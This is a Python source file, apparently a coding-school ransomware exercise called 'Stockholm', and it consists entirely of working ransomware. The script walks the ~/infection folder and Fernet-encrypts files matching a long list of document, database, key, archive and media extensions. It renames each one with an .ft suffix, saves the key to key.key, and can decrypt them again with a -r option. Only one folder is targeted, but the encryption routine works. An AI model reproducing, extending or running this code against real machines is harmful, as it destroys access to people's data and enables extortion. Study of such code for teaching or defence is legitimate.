import argparse
import os
from cryptography.fernet import Fernet

infect = os.path.join(os.path.expanduser('~'), 'infection')
extensions = [".c", ".sh", ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max",
            ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg",
            ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf", ".odb",
            ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".ps1",
            ".vbs", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", ".swf",
            ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma",
            ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp",
            ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC",
            ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg",
            ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst",
            ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc",
            ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"]


def validate_file(file, mode):
    if os.path.isfile(file) and file not in ['stockholm.py', 'key.key']:
        if mode == 'c':
            for extension in extensions:
                if file.endswith(extension):
                    return True
        elif mode == 'd':
            if file.endswith('.ft'):
                return True
        else:
            exit(1)
    return False

def content(folder):
    if os.path.isdir(folder):
        files = os.listdir(folder)
        if files:
            list = []
            for file in files:
                if os.path.isdir(os.path.join(folder, file)):
                    list += content(os.path.join(folder, file))
                else:
                    list.append(os.path.join(folder, file))
            return list
        else:
            return []
    else:
        exit(1)

def hijack():
    files = []
    success = 0
    for file in content(infect):
        if validate_file(file, 'c'):
            files.append(file)
    key = Fernet.generate_key()
    with open('key.key', 'wb') as f:
        f.write(key)
    
    if not silent and files:
        print("Encrypting files:")    
    
    for file in files:
        if not silent:
            print("\t{}".format(file))

        try:
            with open(file, "rb") as f:
                encrypt = Fernet(key).encrypt(f.read())
            with open(file, "wb") as f:
                f.write(encrypt)
            os.rename(file, file + ".ft")
            success += 1
        except Exception as e:
            if not silent:
                print("Error: Could not encrypt file '{}'.".format(file))
    
    if not silent:
        print("\nEncrypted files:")
        encrypted_list = []
        for file in content(infect):
            if validate_file(file, "d"):
                encrypted_list.append(file)
        for f in sorted(encrypted_list):
            print("\t{}".format(f))

        print("\n\tOverview: {0}/{1} encrypted files.".format(success, len(files)))
    
    return len(files)

def release(folder):
    files = []
    success = 0
    for element in content(infect):
        if validate_file(element, 'd'):
            files.append(element)
            
    if not silent and files:
        print("Decrypting files:")
        for f in sorted(files):
            print("\t{}".format(f))
    
    with open('key.key', 'rb') as f:
        key = f.read()
    
    for file in files:
        name = os.path.split(file)[1]
        dir = os.path.split(file)[0]
        try:
            with open(file, 'rb') as f:
                decrypted = Fernet(key).decrypt(f.read())
            with open(file, 'wb') as f:
                f.write(decrypted)
            os.rename(file, dir + '/' + name[:-3])
            success += 1
        except:
            pass
    if not silent:
        print("\nDecrypted files:")
        decrypted_list = []
        for file in content(infect):
            if validate_file(file, "c"):
                decrypted_list.append(file)
        for f in sorted(decrypted_list):
            print("\t{}".format(f))
        print("\n\tOverview: {0}/{1} files decrypted.\n".format(success, len(files)))
    return len(files)

def read_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-r', help='reverts the infection using the encryption key.', type=str)
    parser.add_argument('-v', help='program version.', action='store_true')
    parser.add_argument('-s', help='disables the information displayed on the screen.', action='store_true')
    parser.add_argument('-m', help='show README.md', action='store_true')
    return parser.parse_args()

if __name__ == '__main__':
    args = read_arguments()
    revert = args.r
    version = args.v
    silent = args.s
    readme = args.m
    
    if version:
        print('Version: Stockholm 42.0')
    elif readme:
        with open('README.md', 'r') as file:
            readme = file.read()
        print("\n" + readme)
    elif revert:
        if revert == "key.key":
            if os.path.exists('key.key'):
                release(infect)
            else:
                exit(1)
        else:
            print("WRONG KEY")
            exit(1)
    else:
        if os.path.exists(infect):
            hijack()
        else:
            print("Error, infection folder not found ($HOME/infection)")
            exit(1)